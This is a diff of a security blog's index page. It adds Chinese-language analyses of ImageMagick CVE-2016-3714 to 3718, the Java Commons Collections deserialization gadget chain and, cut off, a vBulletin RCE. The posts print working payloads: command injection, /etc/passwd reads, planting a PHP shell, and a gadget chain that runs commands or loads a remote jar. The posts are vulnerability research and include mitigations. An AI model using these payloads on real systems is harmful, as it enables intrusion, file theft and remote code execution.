@@ -211,7 +211,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/05/05/WordPress-4-6版本远程代码执行漏洞/" data-id="cj342ywpr0002sjfyli7rg7rk" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2017/05/05/WordPress-4-6版本远程代码执行漏洞/" data-id="cj343myew00050ofyxxxo1555" class="article-share-link">Share</a>
       
       
     </footer>
@@ -362,7 +362,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/03/21/Struts2-S046命令执行漏洞/" data-id="cj342ywot0000sjfye5ydm4dt" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2017/03/21/Struts2-S046命令执行漏洞/" data-id="cj343myeq00040ofy57713w5l" class="article-share-link">Share</a>
       
       
     </footer>
@@ -490,7 +490,610 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2017/03/08/Struts2-Jakarta模块Content-type命令执行漏洞-CVE-2017-5638/" data-id="cj342ywoy0001sjfyburr3r6c" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2017/03/08/Struts2-Jakarta模块Content-type命令执行漏洞-CVE-2017-5638/" data-id="cj343myek00030ofyoyn4n1s3" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-ImageMagic初步分析" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/05/05/ImageMagic初步分析/" class="article-date">
+  <time datetime="2016-05-05T07:30:03.000Z" itemprop="datePublished">2016-05-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/05/05/ImageMagic初步分析/">ImageMagic初步分析</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="ImageMagick介绍"><a href="#ImageMagick介绍" class="headerlink" title="ImageMagick介绍"></a>ImageMagick介绍</h4><p>ImageMagick是一个免费的创建、编辑、合成图片的软件。它可以读取、转换、写入多种格式的图片。图片切割、颜色替换、各种效果的应用，图片的旋转、组合，文本，直线，多边形，椭圆，曲线，附加到图片伸展旋转。ImageMagick是免费软件：全部源码开放，可以自由使用，复制，修改，发布，它遵守GPL许可协议，可以运行于大多数的操作系统，ImageMagick的大多数功能的使用都来源于命令行工具。</p>
+<p>ImageMagick的代码地址 <a href="https://github.com/ImageMagick/ImageMagick" target="_blank" rel="external">https://github.com/ImageMagick/ImageMagick</a></p>
+<h4 id="ImageMagick漏洞介绍"><a href="#ImageMagick漏洞介绍" class="headerlink" title="ImageMagick漏洞介绍"></a>ImageMagick漏洞介绍</h4><p>此次ImageMagick 共爆出了5个CVE。</p>
+<ul>
+<li>CVE-2016-3714 - Insufficient shell characters filtering leads to code execution</li>
+<li>CVE-2016-3718 - SSRF</li>
+<li>CVE-2016-3715 - File deletion</li>
+<li>CVE-2016-3716 - File moving</li>
+<li>CVE-2016-3717 - Local file read</li>
+</ul>
+<p>目前来看，大家热议的漏洞是 CVE-2016-3714，此漏洞利用最为直接，属于有条件的RCE。</p>
+<h4 id="CVE-2016-3714分析"><a href="#CVE-2016-3714分析" class="headerlink" title="CVE-2016-3714分析"></a>CVE-2016-3714分析</h4><p>在代码 ImageMagick/MagickCore/delegate.c 中有 system(sanitize_command) 操作，但是sanitize_command可被用户直接控制，并且对输入的内容没有进行过滤，因此造成命令执行。</p>
+<p>sanitize_command从command中取值，command的内容为</p>
+<p><img src="/2016/05/05/ImageMagic初步分析/m1.png" alt=""></p>
+<p>第99行的代码为：</p>
+<delegate decode="\"https\"" command="\""wget"" -q="" -o="" "%o"="" "https:%m"\"="">
+
+<p>而command命令为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;wget&quot; -q -O &quot;%o&quot; &quot;https:%M&quot;</div></pre></td></tr></table></figure>
+<p>而%M是从我们输入的内容获取的，因此我们只要构造一个https开头的链接，再拼上命令即可完成RCE（需要考虑双引号的闭合）。</p>
+<p>POC</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">convert &apos;https://test&quot;|whoami&quot;&apos; 1.png</div></pre></td></tr></table></figure>
+<p><img src="/2016/05/05/ImageMagic初步分析/m2.png" alt=""></p>
+<p>对于mvg图片的转化，我们生成一个mvg文件，如下所示</p>
+<p><img src="/2016/05/05/ImageMagic初步分析/m3.png" alt=""></p>
+<p>执行convert后，如期产生echo内容。</p>
+<p><img src="/2016/05/05/ImageMagic初步分析/m4.png" alt=""></p>
+<p>对于svg图片的转化，我们生成一个svg文件，如下所示</p>
+<p><img src="/2016/05/05/ImageMagic初步分析/m5.png" alt=""></p>
+<p>执行convert后，如期产生echo内容。</p>
+<p><img src="/2016/05/05/ImageMagic初步分析/m6.png" alt=""></p>
+<h4 id="CVE-2016-3718分析"><a href="#CVE-2016-3718分析" class="headerlink" title="CVE-2016-3718分析"></a>CVE-2016-3718分析</h4><p>此漏洞属于SSRF，可以利用mvg语法的url函数，向服务器发起http请求，根据响应时间，判断服务器地址是否存在。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ssrf.mvg</div><div class="line">-=-=-=-=-=-=-=-=-</div><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">fill &apos;url(http://example.com/)&apos;</div><div class="line">pop graphic-context</div><div class="line"> </div><div class="line">$ convert ssrf.mvg out.png</div></pre></td></tr></table></figure>
+<h4 id="CVE-2016-3715分析"><a href="#CVE-2016-3715分析" class="headerlink" title="CVE-2016-3715分析"></a>CVE-2016-3715分析</h4><p>此漏洞属于任意文件删除，可以利用mvg语法的ephemeral协议，删除当前权限下的服务器的任意文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">delete_file.mvg</div><div class="line">-=-=-=-=-=-=-=-=-</div><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">image over 0,0 0,0 &apos;ephemeral:/tmp/delete.txt&apos;</div><div class="line">popgraphic-context</div><div class="line"> </div><div class="line">$ touch /tmp/delete.txt</div><div class="line">$ convert delete_file.mvg out.png # deletes /tmp/delete.txt</div></pre></td></tr></table></figure>
+<h4 id="CVE-2016-3716分析"><a href="#CVE-2016-3716分析" class="headerlink" title="CVE-2016-3716分析"></a>CVE-2016-3716分析</h4><p>此漏洞属于任意文件更改，可以利用mvg语法的msl协议，使用效果类似于linux下的move命令。</p>
+<p>在特定条件下，如对文件后缀进行了过滤，但是可以上传文件，并且知道文件的绝对路径，此时再使用ImageMagick库就会产生问题。有些情况下，可以产生服务器被拿下的风险。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">file_move.mvg</div><div class="line">-=-=-=-=-=-=-=-=-</div><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">image over 0,0 0,0 &apos;msl:/tmp/msl.txt&apos;</div><div class="line">popgraphic-context</div><div class="line"> </div><div class="line">/tmp/msl.txt</div><div class="line">-=-=-=-=-=-=-=-=-</div><div class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</div><div class="line">&lt;image&gt;</div><div class="line">&lt;read filename=&quot;/tmp/image.gif&quot; /&gt;</div><div class="line">&lt;write filename=&quot;/var/www/shell.php&quot; /&gt;</div><div class="line">&lt;/image&gt;</div><div class="line"> </div><div class="line">/tmp/image.gif - image with php shell inside</div><div class="line">(https://www.secgeek.net/POC/POC.gif for example)</div><div class="line"> </div><div class="line">$ convert file_move.mvg out.png</div></pre></td></tr></table></figure>
+<h4 id="CVE-2016-3717分析"><a href="#CVE-2016-3717分析" class="headerlink" title="CVE-2016-3717分析"></a>CVE-2016-3717分析</h4><p>此漏洞属于任意文件读取，可以利用mvg语法的label协议，读取当前权限下的服务器的任意文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">file_read.mvg</div><div class="line">-=-=-=-=-=-=-=-=-</div><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">image over 0,0 0,0 &apos;label:@/etc/passwd&apos;</div><div class="line">pop graphic-context</div><div class="line"> </div><div class="line">$ convert file_read.mvg out.png</div></pre></td></tr></table></figure>
+<h4 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h4><p>此漏洞和java反序列化漏洞造成影响的方式相似，均为需要结合具体的应用才能造成危害。</p>
+<p>目前从乌云报告的漏洞来看，Wordpress的图片功能，新浪的SAE沙盒绕过，Baidu上传图片接口，人人网等已被爆出漏洞。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://www.wooyun.org/bugs/wooyun-2016-0205051</div><div class="line">http://www.wooyun.org/bugs/wooyun-2016-0205206</div><div class="line">http://www.wooyun.org/bugs/wooyun-2016-0205047</div><div class="line">http://www.wooyun.org/bugs/wooyun-2016-0205256</div></pre></td></tr></table></figure>
+<p>由于此漏洞的利用方式比较特殊，因此不具备批量扫描的能力。</p>
+<h4 id="防护方案"><a href="#防护方案" class="headerlink" title="防护方案"></a>防护方案</h4><p>1，鉴定图片文件的文件头是否符合预期。</p>
+<p>2，修改ImageMagick的配置文件（Mac的路径为 /usr/local/Cellar/imagemagick/6.9.3-0/etc/ImageMagick-6/policy.xml），如下所示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;policymap&gt;</div><div class="line">    &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;EPHEMERAL&quot; /&gt;</div><div class="line">    &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;URL&quot; /&gt;</div><div class="line">    &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;HTTPS&quot; /&gt;</div><div class="line">    &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;MVG&quot; /&gt;</div><div class="line">    &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;MSL&quot; /&gt;</div><div class="line">&lt;/policymap&gt;</div></pre></td></tr></table></figure>
+<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="http://pastebin.com/aE4sKnCg" target="_blank" rel="external">http://pastebin.com/aE4sKnCg</a></p>
+<p><a href="http://weibo.com/p/1001603971443670055277" target="_blank" rel="external">http://weibo.com/p/1001603971443670055277</a></p>
+</delegate>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/05/05/ImageMagic初步分析/" data-id="cj343myeb00010ofyz4izood8" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Java反序列化内容" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2015/12/22/Java反序列化内容/" class="article-date">
+  <time datetime="2015-12-22T07:21:17.000Z" itemprop="datePublished">2015-12-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/12/22/Java反序列化内容/">Java反序列化内容</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Java反序列化漏洞简介"><a href="#Java反序列化漏洞简介" class="headerlink" title="Java反序列化漏洞简介"></a>Java反序列化漏洞简介</h2><ul>
+<li>Java序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中，Java中的ObjectOutputStream类的writeObject()方法可以实现序列化。</li>
+<li>Java反序列化即逆过程，由字节流还原成对象。ObjectInputStream类的readObject()方法用于反序列化。</li>
+</ul>
+<p>因此要利用Java反序列化漏洞，需要在<strong>进行反序列化的地方</strong>传入<strong>攻击者的序列化代码</strong>。能符合以上条件的地方即存在漏洞。</p>
+<h2 id="Java反序列化Poc详解"><a href="#Java反序列化Poc详解" class="headerlink" title="Java反序列化Poc详解"></a>Java反序列化Poc详解</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">public class test &#123;</div><div class="line">    public static void main(String[] args) throws Exception &#123;</div><div class="line">        String[] execArgs = new String[] &#123; &quot;sh&quot;, &quot;-c&quot;, &quot;whoami &gt; /tmp/fuck&quot; &#125;;</div><div class="line">        Transformer[] transformers = new Transformer[] &#123;</div><div class="line">            new ConstantTransformer(Runtime.class),</div><div class="line">            new InvokerTransformer(</div><div class="line">                &quot;getMethod&quot;, </div><div class="line">                new Class[] &#123;String.class, Class[].class &#125;, </div><div class="line">                new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;</div><div class="line">            ),</div><div class="line">            new InvokerTransformer(</div><div class="line">                &quot;invoke&quot;, </div><div class="line">                new Class[] &#123;Object.class, </div><div class="line">                Object[].class &#125;, new Object[] &#123;null, null &#125;</div><div class="line">            ),</div><div class="line">            new InvokerTransformer(</div><div class="line">                &quot;exec&quot;, </div><div class="line">                new Class[] &#123;String[].class &#125;, </div><div class="line">                new Object[] &#123; execArgs &#125;</div><div class="line">            )</div><div class="line">         &#125;;</div><div class="line">        Transformer transformedChain = new ChainedTransformer(transformers);</div><div class="line">        </div><div class="line">        Map&lt;String, String&gt; BeforeTransformerMap = new HashMap&lt;String, String&gt;();</div><div class="line">        BeforeTransformerMap.put(&quot;hello&quot;, &quot;manning&quot;);</div><div class="line">        </div><div class="line">        Map AfterTransformerMap = TransformedMap.decorate(BeforeTransformerMap, null, transformedChain);</div><div class="line"></div><div class="line">        Class cl = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</div><div class="line">        </div><div class="line">        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);</div><div class="line">        ctor.setAccessible(true);</div><div class="line">        Object instance = ctor.newInstance(Target.class, AfterTransformerMap);</div><div class="line"></div><div class="line">        File f = new File(&quot;temp.bin&quot;);</div><div class="line">        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));</div><div class="line">        out.writeObject(instance);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>如果想彻底理解上面的poc，需要明白Java中的一些概念。</p>
+<p>在Apache commons工具包中有很多jar包（jar包可以理解为python的库），具体jar包里面含有的内容，如下图所示。</p>
+<p><img src="/2015/12/22/Java反序列化内容/org_apache_commons.png" alt=""></p>
+<p>其中Java反序列化的问题出在org.apache.commons.collections这个库里面。org.apache.commons.collections提供一个类包来扩展和增加标准的Java的collection框架，也就是说这些扩展也属于collection的基本概念，只是功能不同罢了。Java中的collection可以理解为一组对象，collection里面的对象称为collection的对象。具象的collection为set，list，queue等等。换一种理解方式，collection是set，list，queue的抽象，collection中文含义是收集的意思，那么收集的具体方式就可以是set，list，queue了。</p>
+<p>在org.apache.commons.collections内提供了一个接口类叫Transformer，这个接口的英文定义为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Defines a functor interface implemented by classes that transform one object into another.</div></pre></td></tr></table></figure>
+<p>也就是说<strong>接口于Transformer</strong>的类都具备<strong>把一个对象转化为另一个对象</strong>的功能。目前已知<strong>接口于Transformer的类</strong>，如下如所示。</p>
+<p><img src="/2015/12/22/Java反序列化内容/interface_transformer.png" alt=""></p>
+<p>图上带箭头指示的为<strong>Java反序列化漏洞的poc</strong>含有的类。</p>
+<ul>
+<li><p>ConstantTransformer</p>
+<p>  Transformer implementation that returns the same constant each time. （把一个对象转化为常量，并返回）</p>
+</li>
+<li><p>InvokerTransformer</p>
+<p>  Transformer implementation that creates a new object instance by reflection. （通过反射，返回一个对象）</p>
+</li>
+<li><p>ChainedTransformer</p>
+<p>  Transformer implementation that chains the specified transformers together. （把一些transformer链接到一起，构成一组链条，对一个对象依次通过链条内的每一个transformer进行转换）</p>
+</li>
+</ul>
+<p>有了以上的相关概念，就可以理解最开始的poc了。poc里面，我们一共创建了以下关键对象。</p>
+<ul>
+<li><p>execArgs</p>
+<p>  待执行的命令数组</p>
+</li>
+<li><p>transformers</p>
+<p>  一个transformer链，包含预设转化逻辑（各类transformer对象）的转化数组</p>
+</li>
+<li><p>transformedChain</p>
+<p>  ChainedTransformer类对象，传入transformers数组，可以按照transformers数组的逻辑执行转化操作</p>
+</li>
+<li><p>BeforeTransformerMap</p>
+<p>  Map数据结构，转换前的Map，Map数据结构内的对象是键值对形式，类比于python的dict理解即可</p>
+</li>
+<li><p>AfterTransformerMap</p>
+<p>  Map数据结构，转换后的Map</p>
+</li>
+</ul>
+<p>整个poc的逻辑可以这么理解，构建了BeforeTransformerMap的键值对，为其赋值，利用TransformedMap的decorate方法，可以对Map数据结构的key，value进行transforme。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">TransformedMap.decorate方法,预期是对Map类的数据结构进行转化，该方法有三个参数。第一个参数为待转化的Map对象，第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空），第三个参数为Map对象内的value要经过的转化方法。</div><div class="line"></div><div class="line">TransformedMap.decorate(目标Map, key的转化对象（单个或者链或者null）, value的转化对象（单个或者链或者null）);</div></pre></td></tr></table></figure>
+<p><img src="/2015/12/22/Java反序列化内容/point.png" alt=""></p>
+<p>上图是调试时的转换变量内容，可以很清楚地看到执行完poc后，已经对Map的value进行了转换（过了一遍transformer链）。</p>
+<p>poc中对BeforeTransformerMap的value进行转换，当BeforeTransformerMap的value执行完一个完整转换链，就完成了命令执行。</p>
+<p>在进行反序列化时，我们会调用ObjectInputStream类的readObject()方法。如果被反序列化的类重写了readObject()，那么该类在进行反序列化时，Java会优先调用重写的readObject()方法。</p>
+<p>结合前述Commons Collections的特性，如果某个可序列化的类重写了readObject()方法，并且在readObject()中对Map类型的变量进行了键值修改操作，并且这个Map变量是可控的，就可以实现我们的攻击目标了。</p>
+<p>因此我们在poc中看见了下行的代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Class cl = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</div></pre></td></tr></table></figure>
+<p>这个类完全符合我们的要求，具体解释可以查看<a href="http://security.tencent.com/index.php/blog/msg/97" target="_blank" rel="external">TSRC的文章</a>。</p>
+<p><strong>如果要实现一个可控的poc，需要对transformer链的构造进行理解。首先来看InvokerTransformer。</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)</div><div class="line">参数依次为：方法名称，参数类型，参数对象</div><div class="line"></div><div class="line">我们找其中一个来看下。</div><div class="line"></div><div class="line"></div><div class="line">new InvokerTransformer(</div><div class="line">        &quot;getMethod&quot;, </div><div class="line">        new Class[]  &#123;String.class, Class[].class &#125;, </div><div class="line">        new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;</div><div class="line">    ),</div><div class="line">new InvokerTransformer(</div><div class="line">        &quot;invoke&quot;, </div><div class="line">        new Class[] &#123;Object.class, Object[].class &#125;, </div><div class="line">        new Object[] &#123;null, null &#125;</div><div class="line">        ),</div><div class="line">new InvokerTransformer(</div><div class="line">        &quot;exec&quot;, </div><div class="line">        new Class[] &#123;String.class &#125;, </div><div class="line">        new Object[] &#123;&quot;gedit&quot;&#125;</div><div class="line">    )</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">参数类型里面的内容完全对应于参数对象里的内容。</div><div class="line"></div><div class="line">PS：由于Method类的invoke(Object obj,Object args[])方法的定义，所以在反射内写new Class[] &#123;Object.class, Object[].class &#125;。</div><div class="line"></div><div class="line"></div><div class="line">所以正常流程如下所示：</div><div class="line"></div><div class="line">((Runtime)Runtime.class.getMethod(&quot;getRuntime&quot;,null).invoke(null,null)).exec(&quot;gedit&quot;); </div><div class="line">``` </div><div class="line">    </div><div class="line"></div><div class="line">## 基于报错的反序列化transformer链</div></pre></td></tr></table></figure>
+<p>Transformer[] transformers = new Transformer[] {<br>new ConstantTransformer(Java.net.URLClassLoader.class),<br>new InvokerTransformer(<br>        “getConstructor”,<br>        new Class[] {Class[].class},<br>        new Object[] {new Class[]{Java.net.URL[].class}}<br>    ),<br>new InvokerTransformer(<br>        “newInstance”,<br>        new Class[] {Object[].class},<br>        new Object[] { new Object[] { new Java.net.URL[] { new Java.net.URL(url) }}}<br>    ),<br>new InvokerTransformer(<br>        “loadClass”,<br>        new Class[] { String.class },<br>        new Object[] { “ErrorBaseExec” }<br>    ),<br>new InvokerTransformer(<br>        “getMethod”,<br>        new Class[]{String.class, Class[].class},<br>        new Object[]{“do_exec”, new Class[]{String.class}}<br>    ),<br>new InvokerTransformer(<br>        “invoke”,<br>        new Class[]{Object.class, Object[].class},<br>        new Object[]{null, new String[]{cmd}}<br>    )<br>};<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">有了先前的理解，这个链就很明了了。先建立一个读取远程jar文件的类 URLClassLoader，实例化这个类，传入要访问的url，再读取远程加载类，接着获取类方法，然后反射这个方法。</div><div class="line"></div><div class="line"></div><div class="line">## 关于RMI利用的相关内容</div><div class="line"></div><div class="line">申总已经在[RMI利用文章](http://blog.nsfocus.net/java-deserialization-vulnerability-overlooked-mass-destruction/)讲过怎么利用了，这段内容，我只是详解下给出的poc的原理。</div></pre></td></tr></table></figure></p>
+<p>poc部分内容</p>
+<p>Transformer transformedChain = new ChainedTransformer(transformers);</p>
+<p>Map BeforeTransformerMap = new HashMap();<br>innerMap.put(“value”, “value”);<br>Map AfterTransformerMap = TransformedMap.decorate(BeforeTransformerMap, null, transformedChain);</p>
+<p>Class cl = Class.forName(“sun.reflect.annotation.AnnotationInvocationHandler”);<br>Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);<br>ctor.setAccessible(true);<br>Object instance = ctor.newInstance(Target.class, AfterTransformerMap);</p>
+<p>InvocationHandler h = (InvocationHandler) instance;<br>Remote r = Remote.class.cast(Proxy.newProxyInstance(<br>                            Remote.class.getClassLoader(),<br>                            new Class[]{Remote.class},<br>                            h<br>                        )<br>                    );<br>try{<br>    Registry registry = LocateRegistry.getRegistry(ip, port);<br>    registry.rebind(“”, r); // r is remote obj<br>}<br>catch (Throwable e) {<br>    e.printStackTrace();<br>}<br>```<br>RMI利用的poc看上去还是很熟悉的，因为到建立instance时，还和之前的内容一致。之后便到了RMI内容独有的细节，从代码角度可以看出利用逻辑为：</p>
+<ul>
+<li>建立实例对象instance</li>
+<li>实例对象instance 转化为 InvocationHandler类型的句柄h（因为instence是序列化后的内容，所以instance就是一串数据）</li>
+<li>把句柄h附载到Remote类实例 r上</li>
+<li>向<strong>远程服务器</strong>注册，得到<strong>远程注册对象 registry</strong></li>
+<li>向<strong>远程注册对象registry</strong>注册 <strong>实例r</strong></li>
+</ul>
+<p>在Java的RMI中，我们允许向<strong>远程已运行的jvm虚拟环境</strong>中绑定（rebind函数，也可以理解为添加）一些实例对象，通过RMI协议传输一些序列化好的内容，这样服务端解析（也就是反序列化）传过来的数据后，便可把解析后的内容添加到运行环境中。poc中利用动态代理创建remote实例r是可行的一种方式，因此并不唯一。</p>
+<p>因此涉及RMI的代码也会存在Java反序列化漏洞。</p>
+<h2 id="漏洞影响分析"><a href="#漏洞影响分析" class="headerlink" title="漏洞影响分析"></a>漏洞影响分析</h2><p>Java反序列化漏洞从爆出到现在快2个月了。最开始的只能命令执行和反弹shell，到后来的有回显的命令执行，到最终的代码执行，利用上来是越来越方便（有回显的命令执行和代码执行均为利用远程jar文件的利用形式）。从微博来看，已有白帽子实现了jenkins，weblogic，jboss等的代码执行利用工具。待最终利用工具公布，此漏洞还会有一个上升趋势的影响。</p>
+<h2 id="资料引用"><a href="#资料引用" class="headerlink" title="资料引用"></a>资料引用</h2><ul>
+<li><a href="http://blog.chaitin.com/2015-11-11_java_unserialize_rce/" target="_blank" rel="external">http://blog.chaitin.com/2015-11-11_java_unserialize_rce/</a></li>
+<li><a href="http://security.tencent.com/index.php/blog/msg/97" target="_blank" rel="external">http://security.tencent.com/index.php/blog/msg/97</a></li>
+<li><a href="http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/" target="_blank" rel="external">http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/</a></li>
+<li><a href="http://www.infoq.com/cn/articles/cf-java-object-serialization-rmi" target="_blank" rel="external">http://www.infoq.com/cn/articles/cf-java-object-serialization-rmi</a></li>
+<li><a href="http://blog.nsfocus.net/java-deserialization-vulnerability-overlooked-mass-destruction/" target="_blank" rel="external">http://blog.nsfocus.net/java-deserialization-vulnerability-overlooked-mass-destruction/</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2015/12/22/Java反序列化内容/" data-id="cj343myee00020ofyrtds22bf" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-vBulletin-5-0-x-5-1-x-RCE" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2015/11/10/vBulletin-5-0-x-5-1-x-RCE/" class="article-date">
+  <time datetime="2015-11-10T07:16:42.000Z" itemprop="datePublished">2015-11-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/11/10/vBulletin-5-0-x-5-1-x-RCE/">vBulletin 5.0.x - 5.1.x RCE</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>0x00 漏洞综述<br>-</p>
+<p>vBulletin 是一个强大，灵活并可完全根据自己的需要定制的论坛程序套件。它使用目前发展速度最快的 Web 脚本语言php编写，并且基于以高效和疾速著称的数据库引擎 MySQL。并且是世界上用户非常广泛的PHP论坛 。</p>
+<p>vBulletin在其ajax接口使用了反序列化函数unserialize。导致存在漏洞，可以覆盖其上下文中使用的类的类变量，导致可以产生各类问题。</p>
+<p>0x01 漏洞分析<br>-</p>
+<h4 id="1，漏洞本质问题"><a href="#1，漏洞本质问题" class="headerlink" title="1，漏洞本质问题"></a>1，漏洞本质问题</h4><p>hook.php文件的vB_Api_Hook类的decodeArguments方法，传入的值会被进行反序列化操作。并且攻击者还可以控制传入的$arguments的值，因此漏洞的全部演出从这里开始。</p>
+<pre><code>public function decodeArguments($arguments)
+{
+ =》if ($args = @unserialize($arguments))
+    {
+        ...
